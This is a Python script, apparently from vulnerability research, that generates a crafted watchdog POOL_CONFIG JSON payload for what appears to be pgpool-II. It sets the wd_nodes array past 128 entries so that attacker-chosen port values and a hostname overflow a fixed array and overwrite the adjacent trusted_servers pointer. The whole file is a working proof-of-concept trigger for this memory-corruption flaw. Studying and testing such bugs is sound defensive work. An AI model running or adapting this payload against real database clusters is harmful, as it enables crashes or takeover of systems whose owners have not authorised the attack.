#!/usr/bin/env python3
"""Build a watchdog peer POOL_CONFIG JSON with a peer-chosen wd_nodes length.

W9 wire probe: backend_desc is kept safe (length 1) and wd_nodes is set to the
peer-chosen length N. For i >= 128 the parser stores wd_port/pgpool_port and
strncpy's hostname past the fixed 128-entry array, overlapping the following
trusted_servers pointer. Used for the loopback type-'Z' (WD_POOL_CONFIG_DATA)
replay only.
"""
import json
import sys

n = int(sys.argv[1]) if len(sys.argv) > 1 else 129
chosen = int(sys.argv[2], 0) if len(sys.argv) > 2 else 0x42424242
host = sys.argv[3] if len(sys.argv) > 3 else "wxyzUUUUUUUU"

int_keys = (
    "listen_backlog_multiplier child_life_time connection_life_time "
    "child_max_connections client_idle_limit max_pool num_init_children "
    "min_spare_children max_spare_children process_management_mode "
    "process_management_strategy health_check_timeout health_check_period "
    "health_check_max_retries health_check_retry_delay recovery_timeout "
    "search_primary_node_timeout client_idle_limit_in_recovery wd_priority "
    "pgpool_node_id"
).split()
bool_keys = (
    "replication_mode enable_pool_hba load_balance_mode "
    "replication_stop_on_mismatch allow_clear_text_frontend_auth "
    "failover_if_affected_tuples_mismatch replicate_select connection_cache "
    "failover_on_backend_error insert_lock memory_cache_enabled use_watchdog "
    "clear_memqcache_on_escalation failover_when_quorum_exists "
    "failover_require_consensus allow_multiple_failover_requests_from_node"
).split()

cfg = {k: 0 for k in int_keys}
cfg.update({k: 0 for k in bool_keys})  # getter accepts integer-encoded bools
cfg["backend_desc"] = [{"backend_port": 5432, "backend_hostname": "h"}]
cfg["wd_nodes"] = [
    {
        "wd_port": chosen if i >= 128 else 9000,
        "pgpool_port": chosen if i >= 128 else 9999,
        "hostname": host if i >= 128 else "node0",
    }
    for i in range(n)
]
print(json.dumps(cfg, separators=(",", ":")))
